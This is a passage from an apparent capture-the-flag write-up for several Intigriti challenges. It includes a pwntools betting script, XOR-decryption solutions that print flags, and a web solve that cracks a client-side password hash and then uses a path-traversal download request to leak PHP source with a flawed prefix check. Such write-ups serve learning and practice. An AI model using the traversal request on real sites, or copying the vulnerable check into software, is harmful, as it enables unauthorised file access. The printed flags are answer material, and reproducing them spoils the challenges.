+<p>Then here&rsquo;s the pwntools script for automating the bets :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Connect to the predictor process</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#print(stringlist_list)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Start the second process</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#39;./rigged_slot1&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;riggedslot1.ctf.intigriti.io&#39;</span><span class="p">,</span> <span class="mi">1332</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./predictor&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Receive all data from the process</span>
+</span></span><span class="line"><span class="cl"><span class="n">stringlist</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Decode the bytes object to a string</span>
+</span></span><span class="line"><span class="cl"><span class="n">decoded_stringlist</span> <span class="o">=</span> <span class="n">stringlist</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Convert the string to a list by splitting on spaces</span>
+</span></span><span class="line"><span class="cl"><span class="n">stringlist_list</span> <span class="o">=</span> <span class="n">decoded_stringlist</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;100&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">stringlist_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Send the number to the process</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;100&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Sent: 100&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Receive the response from the process</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Sent: 1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Receive the response from the process</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline_startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Current Balance: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;$&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;balance : &#34;</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">133742</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</span></span></code></pre></div><h2 id="secure-bank---rev">Secure Bank - Rev</h2>
+<h3 id="description-14">Description</h3>
+<p>Can you crack the bank?</p>
+<p>nc securebank.ctf.intigriti.io 1335</p>
+<h3 id="explanation-14">Explanation</h3>
+<p>First key was 1337, easily found by decompiling the binary.</p>
+<p>For the second key. It felt easier to just run gdb and look at what the input is being compared with.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7bEE41CC82-684F-4217-8356-394EDD37A09E%7d.png"
+        data-srcset="%7bEE41CC82-684F-4217-8356-394EDD37A09E%7d.png, %7bEE41CC82-684F-4217-8356-394EDD37A09E%7d.png 1.5x, %7bEE41CC82-684F-4217-8356-394EDD37A09E%7d.png 2x"
+        data-sizes="auto"
+        alt="{EE41CC82-684F-4217-8356-394EDD37A09E}.png"
+        title="alt text" /></p>
+<h2 id="triforce-recon---rev">TriForce Recon - Rev</h2>
+<h3 id="description-15">Description</h3>
+<p>you have intercepted a classified message that has been divided into three encrypted executables and were each hidden on different operating systems.</p>
+<p>Flag format: INTGRITI{Flag1+Flag2+Flag3}</p>
+<h3 id="explanation-15">Explanation</h3>
+<p>We get the first part by reversing the program&rsquo;s algorithm :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">:</span> <span class="nb">bytearray</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hex_to_string</span><span class="p">(</span><span class="n">hex_str</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytearray</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">byte_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">byte_array</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hex_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">byte_array</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hex_string</span> <span class="o">=</span> <span class="s2">&#34;7e54595f09434b0f4a5d59757b514a5b6d550d0f0c765b7d45&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;8&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">hex_to_string</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Correct flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><p>Flag1{s7reaMCircUm574NcE}</p>
+<p>We can aquire the second part by running Courage.out, it&rsquo;s an ELF.</p>
+<p>Same code as part1 : hex string is 775a5051034d5644706002635f467d0570030558454b and key is 16</p>
+<p>Flag2{grAV3UnpL3A54nt}</p>
+<p>Third part is the exact same code again just change the hex string to 755e525500496177065b057c076602025d6152467a0755735046025d5d4f and the key to 32.</p>
+<p>Flag3{RE5i6N4T10nSatI5fAct1on}</p>
+<h2 id="pizza-paradise---web">Pizza Paradise - Web</h2>
+<h3 id="description-16">Description</h3>
+<p>Something weird going on at this pizza store!!</p>
+<h3 id="explanation-16">Explanation</h3>
+<p>First things first let&rsquo;s check if the site has robots.txt :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /secret_172346606e1d24062e891d537e917a90.html
+</span></span><span class="line"><span class="cl">Disallow: /assets/
+</span></span></code></pre></div><p>Yep, let&rsquo;s head to this url :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b215BA182-CBCE-4F41-BB86-26EA46CE777D%7d.png"
+        data-srcset="%7b215BA182-CBCE-4F41-BB86-26EA46CE777D%7d.png, %7b215BA182-CBCE-4F41-BB86-26EA46CE777D%7d.png 1.5x, %7b215BA182-CBCE-4F41-BB86-26EA46CE777D%7d.png 2x"
+        data-sizes="auto"
+        alt="{215BA182-CBCE-4F41-BB86-26EA46CE777D}.png"
+        title="alt text" /></p>
+<p>Woah government files ???</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Top Secret Government Access<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">link</span>
+</span></span><span class="line"><span class="cl">            <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://fonts.googleapis.com/css2?family=Orbitron&amp;display=swap&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/assets/css/secret-theme.css&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/assets/js/auth.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">function</span> <span class="nx">hashPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="kd">function</span> <span class="nx">validate</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">credentials</span> <span class="o">=</span> <span class="nx">getCredentials</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">passwordHash</span> <span class="o">=</span> <span class="nx">hashPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">username</span> <span class="o">===</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">passwordHash</span> <span class="o">===</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">passwordHash</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Invalid credentials!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Top Secret Government Access<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;loginForm&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;login.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;return validate();&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;</span>Username:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">required</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span>Password:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">required</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Login&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Interesting, let&rsquo;s check the js file :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">validUsername</span> <span class="o">=</span> <span class="s2">&#34;agent_1337&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">validPasswordHash</span> <span class="o">=</span> <span class="s2">&#34;91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getCredentials</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">username</span><span class="o">:</span> <span class="nx">validUsername</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">passwordHash</span><span class="o">:</span> <span class="nx">validPasswordHash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>An easily crackable password hash, thank God :
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b80CE55E5-0F2C-4105-A917-46671A1DD347%7d.png"
+        data-srcset="%7b80CE55E5-0F2C-4105-A917-46671A1DD347%7d.png, %7b80CE55E5-0F2C-4105-A917-46671A1DD347%7d.png 1.5x, %7b80CE55E5-0F2C-4105-A917-46671A1DD347%7d.png 2x"
+        data-sizes="auto"
+        alt="{80CE55E5-0F2C-4105-A917-46671A1DD347}.png"
+        title="alt text" /></p>
+<p>and we&rsquo;re in :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b595CD701-8739-4B77-BB9F-62DFFDE0ACC7%7d.png"
+        data-srcset="%7b595CD701-8739-4B77-BB9F-62DFFDE0ACC7%7d.png, %7b595CD701-8739-4B77-BB9F-62DFFDE0ACC7%7d.png 1.5x, %7b595CD701-8739-4B77-BB9F-62DFFDE0ACC7%7d.png 2x"
+        data-sizes="auto"
+        alt="{595CD701-8739-4B77-BB9F-62DFFDE0ACC7}.png"
+        title="alt text" /></p>
+<p>For now we can only download a handful of files, but we can do a little trick :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download<span class="o">=</span>/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
+</span></span></code></pre></div><p>Voila :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">HTTP</span><span class="o">/</span><span class="mi">2</span> <span class="mi">200</span> <span class="nx">OK</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Date</span><span class="o">:</span> <span class="nx">Sat</span><span class="p">,</span> <span class="mi">16</span> <span class="nx">Nov</span> <span class="mi">2024</span> <span class="mi">13</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">46</span> <span class="nx">GMT</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">octet</span><span class="o">-</span><span class="nx">stream</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">1819</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Server</span><span class="o">:</span> <span class="nx">istio</span><span class="o">-</span><span class="nx">envoy</span>
+</span></span><span class="line"><span class="cl"><span class="nx">X</span><span class="o">-</span><span class="nx">Powered</span><span class="o">-</span><span class="nx">By</span><span class="o">:</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">8.3</span><span class="o">.</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span> <span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="s2">&#34;topsecret_a9aedc6c39f654e55275ad8e65e316b3.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">X</span><span class="o">-</span><span class="nx">Envoy</span><span class="o">-</span><span class="nx">Upstream</span><span class="o">-</span><span class="nx">Service</span><span class="o">-</span><span class="nx">Time</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="s1">&#39;INTIGRITI{70p_53cr37_m15510n_c0mpl373}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;download&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;download&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;/assets/images/&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filePath</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: application/octet-stream&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Length: &#39;</span> <span class="o">.</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">readfile</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File not found!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;File path not allowed!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;Top Secret Portal&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link href=&#34;https://fonts.googleapis.com/css2?family=Orbitron&amp;display=swap&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;/assets/css/secret-theme.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;/assets/js/displayImage.js&#34;&gt;&lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;h1&gt;Welcome to the Top Secret Government Portal&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;p&gt;Authorized personnel only.&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;img id=&#34;selectedImage&#34; src=&#34;/assets/images/topsecret1.png&#34; alt=&#34;Selected Image&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;form method=&#34;GET&#34; action=&#34;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;label for=&#34;image&#34;&gt;Select Image to Download:&lt;/label&gt;
